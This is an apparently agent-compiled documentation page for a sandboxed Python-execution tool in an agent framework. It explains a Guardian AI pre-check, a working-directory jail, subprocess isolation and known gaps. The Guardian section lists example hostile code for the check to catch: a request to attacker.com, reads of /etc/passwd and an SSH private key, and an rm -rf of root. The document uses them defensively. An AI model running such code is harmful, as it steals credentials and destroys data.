---
{
  "title": "RunPythonTool: Guardian-Reviewed Sandboxed Python Execution",
  "summary": "The `RunPythonTool` lets the PocketPaw agent execute arbitrary Python code in a sandboxed subprocess, subject to a Guardian AI safety review before execution. The sandbox uses the configured `file_jail_path` as its working directory, and UUID-based script filenames prevent filename collisions when multiple executions overlap. Trust level is `elevated` because arbitrary code execution is the most powerful and dangerous capability an agent can have.",
  "concepts": [
    "RunPythonTool",
    "Guardian AI",
    "sandboxed subprocess",
    "Python execution",
    "UUID script names",
    "file_jail_path",
    "sys.executable",
    "timeout",
    "trust level",
    "BaseTool",
    "code safety",
    "shell isolation"
  ],
  "categories": [
    "builtin tools",
    "code execution",
    "security",
    "agent capabilities"
  ],
  "source_docs": [
    "6aa101e7e072389d"
  ],
  "backlinks": null,
  "word_count": 556,
  "compiled_at": "2026-04-24T04:26:10Z",
  "compiled_with": "agent",
  "version": 1,
  "audience": "human",
  "depth": "deep",
  "target_words": 500
}
---

## Overview

`python_exec.py` was created 2026-03-12. The ability to execute Python code dramatically expands what the agent can do: data processing, file format conversion, statistical analysis, chart generation, and interactions with installed libraries that have no dedicated tool. It is also the highest-risk capability in the tool suite — arbitrary code can do anything the OS permits.

The tool addresses this through a Guardian AI pre-check and a filesystem sandbox.

## Guardian pre-check

```python
async def execute(self, code: str, timeout: int = 120) -> str:
    is_safe, reason = await get_guardian().check_command(code)
    if not is_safe:
        return self._error(f"Code blocked by Guardian: {reason}")
```

The Guardian reviews the code before a subprocess is spawned. This is the primary safety gate. The Guardian looks for:

- **Network access** to unexpected hosts (e.g., `requests.get("http://attacker.com/...")`)
- **Sensitive file access** (e.g., `open('/etc/passwd')`, `open(os.path.expanduser('~/.ssh/id_rsa'))`)
- **Shell escape attempts** (e.g., `os.system(...)`, `subprocess.run(['rm', '-rf', '/'])`)
- **Exfiltration patterns** (reading sensitive files and sending them to external URLs)

The Guardian returns a `reason` string when it blocks code, which is surfaced to the user as a clear explanation.

## Filesystem sandbox

```python
jail_path = get_settings().file_jail_path
jail_path.mkdir(parents=True, exist_ok=True)
```

The subprocess runs with `cwd` set to `jail_path`. While this does not prevent code from accessing paths outside the jail using absolute paths (that is the Guardian's job), it ensures that relative path operations and file output default to the permitted directory. Temporary script files created for execution are also written into the jail directory.

## UUID script filenames

The code is written to a temp file with a UUID-based name before execution:

```python
import uuid
script_name = f"script_{uuid.uuid4().hex}.py"
```

UUID filenames prevent collisions when two concurrent `run_python` calls overlap — which can happen when the agent is used in a multi-agent configuration where two subagents call the tool simultaneously. A sequential counter or timestamp-based name would collide under concurrent load.

## Subprocess isolation

Code executes in a separate `subprocess.run` call rather than `exec()` within the same process. This matters for two reasons:

1. **Isolation**: A crash in the executed code (division by zero, memory error) cannot crash the PocketPaw runtime.
2. **Timeout enforcement**: `asyncio` timeout can terminate a subprocess; it cannot terminate a thread running `exec()` within the same process.

```python
subprocess.run(
    [sys.executable, str(script_path)],
    cwd=jail_path,
    timeout=timeout,
    capture_output=True,
    text=True,
)
```

Using `sys.executable` ensures the executed script has access to the same virtual environment as PocketPaw.

## Trust level

`trust_level = "elevated"` — the same level as `InstallPackageTool`. Both tools have system-level impact. Pockets must explicitly grant this capability.

## Timeout

Default timeout is 120 seconds. The caller can override it. Long-running computations (training a model, processing a large file) may need a longer timeout, while interactive tools should use a short one. The timeout prevents hung subprocesses from consuming system resources indefinitely.

## Known Gaps

- **No resource limits**: Beyond the timeout, there are no CPU, memory, or disk I/O constraints on the subprocess. A malicious or buggy script could exhaust system memory or fill the disk.
- **No network sandboxing**: The Guardian checks for obvious network access patterns, but it cannot prevent all possible network calls. A compiled C extension, for example, could make syscalls the Guardian's code pattern analysis would not detect.
- **Script cleanup**: Temporary script files written to the jail directory are not explicitly cleaned up after execution. Over many executions, these accumulate on disk.